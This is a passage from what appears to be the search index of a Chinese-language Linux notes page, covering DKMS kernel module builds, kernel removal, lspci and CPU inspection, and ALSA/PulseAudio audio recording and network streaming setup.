installing\u00a0dahdi-dkms\u00a0is all that is needed to compile the kernel module for the current kernel provided that we have the\u00a0linux-headers-*\u00a0package matching the installed kernel. For instance, if you use\u00a0linux-image-amd64, you would also install\u00a0linux-headers-amd64.</p> <pre><code>sudo apt install zfs-dkms\n\ndkms status\n# zfs/2.1.5, 5.19.17, x86_64: installed\n\ndkms build\n\ndkms install\ndkms uninstall  zfs/2.1.5\n\ndkms add\ndkms remove zenpower/$(VERSION)   --all\n</code></pre> <p>\u4f8b\u5b50\uff1aTa180m/zenpower3: Migrated to Gitea (github.com) - \u5b89\u88c5header   - pve\u4f7f\u7528\u81ea\u5df1\u7684\u5185\u6838\uff0c\u56e0\u6b64\u4e5f\u662f\u5b89\u88c5\u81ea\u5df1\u7684header <pre><code>apt install linux-headers-$(uname -r)\n\n#pve\napt install proxmox-headers-$(uname -r)\n</code></pre></p> <pre><code>dkms-install:\n        dkms --version &gt;&gt; /dev/null\n        mkdir -p $(DKMS_ROOT_PATH)\n        cp $(CURDIR)/dkms.conf $(DKMS_ROOT_PATH)\n        cp $(CURDIR)/Makefile $(DKMS_ROOT_PATH)\n        cp $(CURDIR)/zenpower.c $(DKMS_ROOT_PATH)\n\n        sed -e \"s/@CFLGS@/${MCFLAGS}/\" \\\n            -e \"s/@VERSION@/$(VERSION)/\" \\\n            -i $(DKMS_ROOT_PATH)/dkms.conf\n\n        dkms add zenpower/$(VERSION)\n        dkms build zenpower/$(VERSION)\n        dkms install zenpower/$(VERSION)\n\ndkms-uninstall:\n        dkms remove zenpower/$(VERSION) --all\n        rm -rf $(DKMS_ROOT_PATH)\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5220\u9664\u5185\u6838","title":"\u5220\u9664\u5185\u6838","text":"<pre><code>dpkg --get-selections | grep 5.19.17\n\napt remove xxx\n</code></pre> <p>\u6216\u8005\u624b\u52a8\u5220\u9664 <pre><code>cd /boot/\nrm -rf *3.19.8*\n\nupdate-grub\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5185\u6838\u6a21\u5757","title":"\u5185\u6838\u6a21\u5757","text":"<pre><code>find /lib/modules/$(uname -r) -type f -name '*.ko'\n\nmodprobe xxx\nmodprobe -r xxx # \u5220\u9664\n\n\nlsmod |grep xxx\nrmmod xxx\n</code></pre> <ol> <li> <p><code>depmod</code>: \u7528\u4e8e\u66f4\u65b0\u5185\u6838\u6a21\u5757\u4f9d\u8d56\u4fe1\u606f\u3002<code>depmod</code> \u547d\u4ee4\u4f1a\u626b\u63cf\u7cfb\u7edf\u4e2d\u7684\u5185\u6838\u6a21\u5757\uff0c\u5e76\u4e3a\u5b83\u4eec\u751f\u6210\u4e00\u4e2a\u4f9d\u8d56\u5173\u7cfb\u6587\u4ef6\uff0c\u901a\u5e38\u5728 <code>/lib/modules/</code> \u76ee\u5f55\u4e0b\u3002\u8fd9\u4e2a\u6587\u4ef6\u901a\u5e38\u88ab\u547d\u540d\u4e3a <code>modules.dep</code>\uff0c\u5b83\u5217\u51fa\u4e86\u6bcf\u4e2a\u6a21\u5757\u53ca\u5176\u4f9d\u8d56\u7684\u5176\u4ed6\u6a21\u5757\uff0c\u4ee5\u786e\u4fdd\u5185\u6838\u6a21\u5757\u6b63\u786e\u52a0\u8f7d\u548c\u5378\u8f7d\u3002</p> </li> <li> <p><code>lsmod</code>: \u7528\u4e8e\u5217\u51fa\u5f53\u524d\u52a0\u8f7d\u5230\u5185\u6838\u4e2d\u7684\u6a21\u5757\u3002<code>lsmod</code> \u547d\u4ee4\u4f1a\u663e\u793a\u5df2\u52a0\u8f7d\u6a21\u5757\u7684\u5217\u8868\uff0c\u4ee5\u53ca\u5b83\u4eec\u7684\u5927\u5c0f\u3001\u4f7f\u7528\u6b21\u6570\u548c\u4f9d\u8d56\u5173\u7cfb\u3002</p> </li> <li> <p><code>modprobe</code>: \u7528\u4e8e\u52a8\u6001\u52a0\u8f7d\u548c\u5378\u8f7d\u5185\u6838\u6a21\u5757\u3002<code>modprobe</code> \u547d\u4ee4\u53ef\u4ee5\u6839\u636e\u6a21\u5757\u540d\u79f0\u81ea\u52a8\u52a0\u8f7d\u6a21\u5757\uff0c\u5e76\u5904\u7406\u5176\u4f9d\u8d56\u5173\u7cfb\u3002\u5b83\u8fd8\u53ef\u4ee5\u7528\u4e8e\u5378\u8f7d\u6a21\u5757\uff0c\u6216\u8005\u901a\u8fc7\u53c2\u6570\u6307\u5b9a\u6a21\u5757\u9009\u9879\u3002</p> </li> <li> <p><code>insmod</code>: \u7528\u4e8e\u624b\u52a8\u52a0\u8f7d\u4e00\u4e2a\u5185\u6838\u6a21\u5757\u3002<code>insmod</code> \u547d\u4ee4\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u6307\u5b9a\u7684\u6a21\u5757\u6587\u4ef6\uff0c\u4f46\u4e0d\u4f1a\u5904\u7406\u6a21\u5757\u7684\u4f9d\u8d56\u5173\u7cfb\u3002\u56e0\u6b64\uff0c\u901a\u5e38\u5efa\u8bae\u4f7f\u7528 <code>modprobe</code> \u6765\u52a0\u8f7d\u6a21\u5757\uff0c\u4ee5\u786e\u4fdd\u6b63\u786e\u5904\u7406\u4f9d\u8d56\u5173\u7cfb\u3002</p> </li> <li> <p><code>rmmod</code>: \u7528\u4e8e\u4ece\u5185\u6838\u4e2d\u5378\u8f7d\u4e00\u4e2a\u5df2\u52a0\u8f7d\u7684\u6a21\u5757\u3002<code>rmmod</code> \u547d\u4ee4\u63a5\u53d7\u6a21\u5757\u540d\u79f0\u4f5c\u4e3a\u53c2\u6570\uff0c\u5e76\u4f1a\u5c1d\u8bd5\u5378\u8f7d\u8be5\u6a21\u5757\uff0c\u524d\u63d0\u662f\u5b83\u6ca1\u6709\u88ab\u5176\u4ed6\u6a21\u5757\u6240\u4f7f\u7528\u3002</p> </li> <li> <p><code>modinfo</code>: \u7528\u4e8e\u83b7\u53d6\u6709\u5173\u5185\u6838\u6a21\u5757\u7684\u4fe1\u606f\u3002<code>modinfo</code> \u547d\u4ee4\u53ef\u4ee5\u5217\u51fa\u6709\u5173\u6a21\u5757\u7684\u4fe1\u606f\uff0c\u5982\u4f5c\u8005\u3001\u63cf\u8ff0\u3001\u53c2\u6570\u7b49\u3002</p> </li> <li> <p><code>ls /lib/modules/</code>: \u8fd9\u4e2a\u547d\u4ee4\u7528\u4e8e\u67e5\u770b\u7cfb\u7edf\u4e2d\u53ef\u7528\u7684\u5185\u6838\u6a21\u5757\u3002\u5728 <code>/lib/modules/</code> \u76ee\u5f55\u4e0b\uff0c\u4f60\u53ef\u4ee5\u627e\u5230\u4e0e\u5df2\u5b89\u88c5\u5185\u6838\u7248\u672c\u76f8\u5173\u7684\u6a21\u5757\u6587\u4ef6\u548c\u4f9d\u8d56\u4fe1\u606f\u3002</p> </li> </ol>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u786c\u4ef6\u76f8\u5173","title":"\u786c\u4ef6\u76f8\u5173","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5173\u95edbeepbell","title":"\u5173\u95edbeep/bell","text":"<p>Turn off beep / bell on linux terminal - Linux Tutorials - Learn Linux Configuration</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u67e5\u770bcpucache","title":"\u67e5\u770bCPU,cache","text":"<p>\u67e5\u770bcache\u5927\u5c0f - vim /proc/cpuinfo   - cache_size\u4e0d\u77e5\u9053\u5177\u4f53\u542b\u4e49\uff0cL2/per core\uff1f   - cache_alignment\u4e3aL1 cache line\u5927\u5c0f? <pre><code>cache size      : 512 KB\nclflush size    : 64\ncache_alignment : 64\naddress sizes   : 48 bits physical, 48 bits virtual\n</code></pre></p> <ul> <li>lscpu</li> <li> <p>\u5f88\u8be6\u7ec6\uff0c\u53ef\u4ee5\u770b\u5230cpu flag, numa, cache <pre><code>Caches (sum of all):\n  L1d:                   256 KiB (8 instances)\n  L1i:                   256 KiB (8 instances)\n  L2:                    4 MiB (8 instances)\n  L3:                    32 MiB (1 instance)\nNUMA:\n  NUMA node(s):          1\n  NUMA node0 CPU(s):     0-15\n</code></pre></p> </li> <li> <p>getconf -a | grep CACHE</p> </li> <li>\u53ef\u4ee5\u770b\u5230cache line\u5927\u5c0f <pre><code>LEVEL1_ICACHE_SIZE                 32768\nLEVEL1_ICACHE_ASSOC\nLEVEL1_ICACHE_LINESIZE             64\nLEVEL1_DCACHE_SIZE                 32768\nLEVEL1_DCACHE_ASSOC                8\nLEVEL1_DCACHE_LINESIZE             64\nLEVEL2_CACHE_SIZE                  524288\nLEVEL2_CACHE_ASSOC                 8\nLEVEL2_CACHE_LINESIZE              64\nLEVEL3_CACHE_SIZE                  33554432\nLEVEL3_CACHE_ASSOC                 0\nLEVEL3_CACHE_LINESIZE              64\nLEVEL4_CACHE_SIZE\nLEVEL4_CACHE_ASSOC\nLEVEL4_CACHE_LINESIZE\n</code></pre></li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#lspci","title":"lspci","text":"<pre><code>apt install pciutils\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5e38\u7528\u9009\u9879","title":"\u5e38\u7528\u9009\u9879","text":"<pre><code>lspci -k  #\u67e5\u770b\u5185\u6838\u9a71\u52a8\n\nlspci -nn #\u67e5\u770b\u8bbe\u5907id\n\nlspci -vv # \u67e5\u770bpcie\u94fe\u8def\u901f\u5ea6\uff1aLnkCap, LnkSta\n- 2.5 GT/s = PCI-e gen 1\n- 5 GT/s = PCI-e gen 2\n- 8 GT/s = PCI-e gen 3\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u6307\u5b9a\u8bbe\u5907","title":"\u6307\u5b9a\u8bbe\u5907","text":"<p><pre><code>-s [[[[&lt;domain&gt;]:]&lt;bus&gt;]:][&lt;device&gt;][.[&lt;func&gt;]]\n</code></pre> - domain: 0 to ffff - bus: 0-ff - device: 0-ff - function: 0-7 - \u53ef\u4ee5\u7701\u53bb\u6216\u8005\u8bbe\u7f6e\u4e3a<code>*</code>\u8868\u793a\u4efb\u610f\u503c <pre><code>-d [vendor]:[device][:class[:prog-if]]\n</code></pre> - vendor: e.g. 10de - device: : e.g. 1c02</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u67e5\u770b\u6811\u72b6\u7ed3\u6784","title":"\u67e5\u770b\u6811\u72b6\u7ed3\u6784","text":"<pre><code>lspci -tv\n</code></pre> <ul> <li>03.1\uff1a\u662f\u00a0slot and function number of the PCIe root hub</li> <li>[08]\u8868\u793a\u5728\u5176\u540e\u9762\u7684\u8bbe\u5907\u7684bus\u4e3a08</li> <li>00.0\u4e3adevice\u548cfunction\u7f16\u53f7 <pre><code>+-03.1-[08]--+-00.0  NVIDIA Corporation GP106 [GeForce GTX 1060 3GB]\n           |            \\-00.1  NVIDIA Corporation GP106 High Definition Audio Controller\n</code></pre></li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u76d1\u63a7\u6e29\u5ea6\u529f\u8017","title":"\u76d1\u63a7(\u6e29\u5ea6\u3001\u529f\u8017)","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#ssd\u6e29\u5ea6","title":"SSD\u6e29\u5ea6","text":"<p>Linux find NVMe SSD temperature using command line - nixCraft (cyberciti.biz)</p> <pre><code>apt install nvme-cli\n\nsudo nvme smart-log /dev/nvme0\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#cpu\u9891\u7387\u529f\u8017","title":"CPU\u9891\u7387\u3001\u529f\u8017","text":"<pre><code>lscpu -e\nCPU NODE SOCKET CORE L1d:L1i:L2:L3 ONLINE    MAXMHZ    MINMHZ      MHZ\n  0    0      0    0 0:0:0:0           \u662f 4850.1948 2200.0000 3023.077\n  1    0      0    1 1:1:1:0           \u662f 4850.1948 2200.0000 3167.647\n  2    0      0    2 2:2:2:0           \u662f 4850.1948 2200.0000 2529.517\n  3    0      0    3 3:3:3:0           \u662f 4850.1948 2200.0000 2895.147\n  4    0      0    4 4:4:4:0           \u662f 4850.1948 2200.0000 3068.640\n  5    0      0    5 5:5:5:0           \u662f 4850.1948 2200.0000 2814.150\n  6    0      0    6 6:6:6:0           \u662f 4850.1948 2200.0000 3097.454\n  7    0      0    7 7:7:7:0           \u662f 4850.1948 2200.0000 3148.684\n  8    0      0    0 0:0:0:0           \u662f 4850.1948 2200.0000 2938.599\n  9    0      0    1 1:1:1:0           \u662f 4850.1948 2200.0000 3376.774\n 10    0      0    2 2:2:2:0           \u662f 4850.1948 2200.0000 4420.665\n 11    0      0    3 3:3:3:0           \u662f 4850.1948 2200.0000 2996.655\n 12    0      0    4 4:4:4:0           \u662f 4850.1948 2200.0000 3100.166\n 13    0      0    5 5:5:5:0           \u662f 4850.1948 2200.0000 2894.990\n 14    0      0    6 6:6:6:0           \u662f 4850.1948 2200.0000 3244.797\n 15    0      0    7 7:7:7:0           \u662f 4850.1948 2200.0000 2897.287\n</code></pre> <p>CPU frequency scaling - ArchWiki (archlinux.org)</p> <p>\u67e5\u770b\u529f\u8017 <pre><code>sudo turbostat\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u97f3\u9891","title":"\u97f3\u9891","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#alsa","title":"ALSA","text":"<pre><code>yfy@TianYi310 \u279c  /dev aplay -l\n**** PLAYBACK \u786c\u9ad4\u88dd\u7f6e\u6e05\u55ae ****\ncard 0: PCH [HDA Intel PCH], device 0: CX20751/2 Analog [CX20751/2 Analog]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\ncard 0: PCH [HDA Intel PCH], device 3: HDMI 0 [HDMI 0]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\ncard 0: PCH [HDA Intel PCH], device 7: HDMI 1 [HDMI 1]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\ncard 0: PCH [HDA Intel PCH], device 8: HDMI 2 [HDMI 2]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\ncard 0: PCH [HDA Intel PCH], device 9: HDMI 3 [HDMI 3]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\ncard 0: PCH [HDA Intel PCH], device 10: HDMI 4 [HDMI 4]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\n</code></pre> <pre><code>root@p2w \\u@\\h:\\w\\$ cat /proc/asound/modules\n 0 snd_usb_audio\n\nroot@p2w \\u@\\h:\\w\\$ arecord -l\n**** List of CAPTURE Hardware Devices ****\ncard 0: Lanseyaoji [Lanseyaoji], device 0: USB Audio [USB Audio]\n  Subdevices: 1/1\n  Subdevice #0: subdevice #0\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#arecord-aplay","title":"arecord, aplay","text":"<p>arecord, aplay - command-line sound recorder and player for ALSA soundcard driver</p> <p><code>arecord -d 10 -f cd -t wav -D copy foobar.wav</code> will record foobar.wav as a 10-second, CD-quality wave file</p> <p>aplay\u64ad\u653e\u8c8c\u4f3c\u53ea\u652f\u6301WAVE\u683c\u5f0f\uff0cmp3\u64ad\u653e\u662f\u566a\u97f3 <pre><code>yfy@TianYi310 \u279c  Downloads aplay 'Laco - NEXUS.mp3'\n\u6b63\u5728\u64ad\u653e \u539f\u59cb\u8cc7\u6599 'Laco - NEXUS.mp3' : Signed 16 bit Little Endian, \u9891\u73878000Hz\uff0c Mono\n^C\u88ab\u4fe1\u53f7 \u4e2d\u65ad...\u9000\u51fa\nyfy@TianYi310 \u279c  Downloads aplay filename.wav\n\u6b63\u5728\u64ad\u653e WAVE 'filename.wav' : Signed 16 bit Little Endian, \u9891\u738744100Hz\uff0c Stereo\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#aplay--l-\u6ca1\u6709\u8bbe\u5907","title":"aplay -l \u6ca1\u6709\u8bbe\u5907","text":"<p>\u4f46\u662froot\u7528\u6237\u6709\u3002\u8fd9\u4e5f\u5bfc\u81f4pulseaudio list sinks\u65f6\u53ea\u6709\u4f2a\u8bbe\u5907\u3002</p> <p>alsa - How do I get sound with an HDA card? - Ask Ubuntu audio - ALSA does not find sound devices as user but can as root after kernel upgrade - Super User</p> <p>\u6ca1\u6709\u5c1d\u8bd5\u53c2\u80031\uff0c\u800c\u662f\u76f4\u63a5\u4fee\u6539\u4e86/dev/snd\u7684\u6743\u9650777\uff08\u6dfb\u52a0\u7528\u6237\u5230audio\u7ec4\u6ca1\u6709\u4f5c\u7528\uff09\uff0c\u95ee\u9898\u89e3\u51b3\u3002</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#pulseaudio","title":"PulseAudio","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#system-wide\u6a21\u5f0f\u548cper-user\u6a21\u5f0f","title":"system-wide\u6a21\u5f0f\u548cper-user\u6a21\u5f0f","text":"<p>\u63a8\u8350\u4f7f\u7528per-user\u6a21\u5f0f\uff0csystem-wide\u6a21\u5f0f\u4e0d\u5b89\u5168\u3002Running PulseAudio as System-Wide Daemon \u2013 PulseAudio (www.freedesktop.org)</p> <p>per-user\u6a21\u5f0f\uff0c\u6bcf\u4e2a\u7528\u6237\u9700\u8981\u4f7f\u7528\u65f6\u542f\u52a8pulseaudio\u3002system\u6a21\u5f0f\u9002\u5408\u6ca1\u6709\u666e\u901a\u7528\u6237\u7684\u5d4c\u5165\u5f0f\u8bbe\u5907</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u8fd0\u884cserver","title":"\u8fd0\u884cserver","text":"<p>Running (www.freedesktop.org)</p> <p>\u6709\u684c\u9762\u73af\u5883\u60c5\u51b5\u4e0b\u4e00\u822c\u60c5\u51b5\u4e0b\u4f1a\u81ea\u52a8\u542f\u52a8\u3002\u4e5f\u53ef\u4ee5\u624b\u52a8\u542f\u52a8</p> <pre><code>pulseaudio --kill # \u5173\u95edpulseaudio server\n\npulseaudio # \u8fd0\u884c\u5728\u524d\u53f0\uff0cctrl-C\u7ed3\u675f\u3002\u4fbf\u4e8e\u5b9e\u65f6\u67e5\u770b\u65e5\u5fd7\npulseaudio --daemonize # daemon\u6a21\u5f0f\uff0c\u8fd0\u884c\u5728\u540e\u53f0\npulseaudio -vv --log-time # \u663e\u793a\u66f4\u591alog\n</code></pre> <p><code>~/.config/pulse/</code>\u4f18\u5148\u7ea7\u9ad8\u4e8e<code>/etc/pulse/</code></p> <ul> <li>default.pa : The default PulseAudio Startup Script Commands in this file run when the daemon is started or restarted. Run\u00a0<code>man default.pa</code>\u00a0for documentation.</li> <li>daemon.conf: The PulseAudio daemon configuration file Run\u00a0<code>man pulse-daemon.conf</code>\u00a0for documentation.</li> <li>system.pa\uff1a\u4ec5\u7528\u4e8esystem-wide\u6a21\u5f0f</li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u63a7\u5236\u547d\u4ee4pactl","title":"\u63a7\u5236\u547d\u4ee4pactl","text":"<p>CLI (www.freedesktop.org)</p> <p>\u901a\u8fc7<code>pactl</code>\u547d\u4ee4\u548cpulseaudio daemon\u8fdb\u884c\u4ea4\u4e92</p> <pre><code>pactl list sources # \u67e5\u770b\u8f93\u5165\u8bbe\u5907\npactl list sinks # \u67e5\u770b\u8f93\u51fa\u8bbe\u5907\n\n# \u8c03\u8282\u97f3\u91cf\npactl set-sink-mute &lt;device&gt; toggle/true/false  # device tab\u81ea\u52a8\u8865\u5168\npactl set-sink-volume &lt;device&gt; 30%\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u8ba9\u9ea6\u514b\u98ce\u8f93\u51fa\u5230\u626c\u58f0\u5668","title":"\u8ba9\u9ea6\u514b\u98ce\u8f93\u51fa\u5230\u626c\u58f0\u5668","text":"<p>sound - How to hear my voice in speakers with a mic? - Ask Ubuntu</p> <pre><code>pactl load-module module-loopback latency_msec=1\n\n# stop\npactl unload-module module-loopback\n</code></pre> <p>\u53e6\u4e00\u4e2a\u529e\u6cd5\u76f4\u63a5\u4f7f\u7528alsa\u547d\u4ee4\u3002 <pre><code>arecord -f cd - | aplay - # \u5ef6\u8fdf\u5f88\u9ad8\narecord -f cd - | tee output.wav | aplay - # \u00a0play while saving\n\narecord --buffer-time=1 - | aplay --buffer-time=1 - # \u6539\u5584\u5ef6\u8fdf\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5c06\u6307\u5b9asource\u8f93\u51fa\u5230\u6307\u5b9asink","title":"\u5c06\u6307\u5b9asource\u8f93\u51fa\u5230\u6307\u5b9asink","text":"<p>Modules \u2013 PulseAudio (www.freedesktop.org)</p> <pre><code>pactl load-module module-loopback latency_msec=1 source=2 sink=0  # \u6570\u5b57\u4e3aindex\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5f55\u6307\u5b9a\u5e94\u7528\u58f0\u97f3","title":"\u5f55\u6307\u5b9a\u5e94\u7528\u58f0\u97f3","text":"<p>p.s \u5173\u952e\u70b9 - \u76f4\u63a5\u5bf9\u8f93\u51fa\u5230\u626c\u58f0\u5668\u7684\u58f0\u97f3\u5f55\u5236\uff0c\u81ea\u5df1\u5c31\u542c\u4e0d\u5230\u58f0\u97f3\u4e86\u3002\u4f7f\u7528combined\uff0c\u5bf9\u8f93\u51fa\u5230headphone\u7684\u58f0\u97f3\u590d\u5236\u4e00\u4efd\uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884c\u5f55\u5236</p> <p>\u53c2\u8003\uff1aLinux audio recording guide (ro-che.info)</p> <ol> <li>Create a \u201cnull\u201d sink that you will be recording. Let\u2019s call it\u00a0<code>recording</code>.</li> <li>Create a combined sink that will send its input to both headphones and the\u00a0<code>recording</code>\u00a0sink. Otherwise, you will be able to record a stream but not hear it yourself. So, let\u2019s call this sink\u00a0<code>combined</code>.</li> <li>Direct the sound from the specific applications you want to record into the combined sink.</li> <li>Record the monitor of the\u00a0<code>recording</code>\u00a0sink to a file.</li> </ol> <p>\u6dfb\u52a0combined\u8bbe\u5907 <pre><code>pacmd load-module module-null-sink sink_name=recording sink_properties=device.description=recording\npacmd load-module module-combine-sink sink_name=combined sink_properties=device.description=combined \\\n  slaves=recording,alsa_output.pci-0000_00_1f.3.analog-stereo\n</code></pre></p> <p>\u5c06combined\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u8f93\u51fa\uff0c\u7136\u540e\u5f00\u59cb\u5f55\u5236 <pre><code>parecord --channels=1 -d recording.monitor filename.wav\n</code></pre></p> <ul> <li>parecord\u5f55\u5236\u6ca1\u6709\u538b\u7f29\uff0c\u53ea\u80fd\u4f7f\u7528parecord\u5f55\u5236\u5417\uff1f</li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u97f3\u9891\u7f51\u7edc\u4e32\u6d41","title":"\u97f3\u9891\u7f51\u7edc\u4e32\u6d41","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li>linux \u5230\u5b89\u5353\u8bbe\u5907\uff1aHow to stream my GNU/Linux audio output to Android devices over WI-FI? - Super User</li> <li>windows\u5230linux\uff1aStreaming audio from Windows to Linux using PulseAudio - Super User</li> <li>windows\u4e0a\u5b89\u88c5\u97f3\u9891\u9a71\u52a8\uff0clinux\u4e0a\u5b89\u88c5scream receiver\uff1aduncanthrax/scream: Virtual network sound card for Microsoft Windows (github.com)</li> <li> <p>windows\u5230android</p> </li> <li> <p>\u624b\u673a\u5230laptop, \u901a\u8fc7pulseaudio\uff1aHow to stream audio from your phone to your laptop with PulseAudio | Hacker News (ycombinator.com)</p> </li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#pulseaudio_1","title":"pulseaudio","text":"<p>Network Setup \u2013 PulseAudio (www.freedesktop.org)</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#direct\u6a21\u5f0f","title":"direct\u6a21\u5f0f","text":"<p>\u6700\u7b80\u5355\u7684\u65b9\u5f0f - \u5728\u9700\u8981\u5b9e\u9645\u64ad\u653e\u58f0\u97f3\u7684\u8bbe\u5907\u4e0a\uff08server\u7aef\uff09\uff0c\u5f00\u542f<code>module-native-protocol-tcp</code>\u5141\u8bb8\u7f51\u7edc\u8fde\u63a5\u3002 - \u7136\u540e\u5728\u5ba2\u6237\u7aef\u4e0a\uff0c\u8bbe\u7f6ePULSE_SERVER\u3002\u8fd9\u6837\u5ba2\u6237\u7aef\u7684\u58f0\u97f3\u5c31\u4f1a\u4ea4\u7ed9\u670d\u52a1\u7aef\u8f93\u51fa   - \u53ef\u4ee5\u901a\u8fc7\u73af\u5883\u53d8\u91cf<code>PULSE_SERVER</code>   - Alternatively you can modify\u00a0<code>~/.pulse/client.conf</code>\u00a0or\u00a0<code>/etc/pulse/client.conf</code>\u00a0and set\u00a0<code>default-server</code>.   <pre><code>export PULSE_SERVER=tcp:&lt;server_ip&gt;:4713\n</code></pre></p> <p>android\u4e0a\u6709pulse server\u8f6f\u4ef6\uff1aXServer XSDL - Google Play \u4e0a\u7684\u5e94\u7528 - 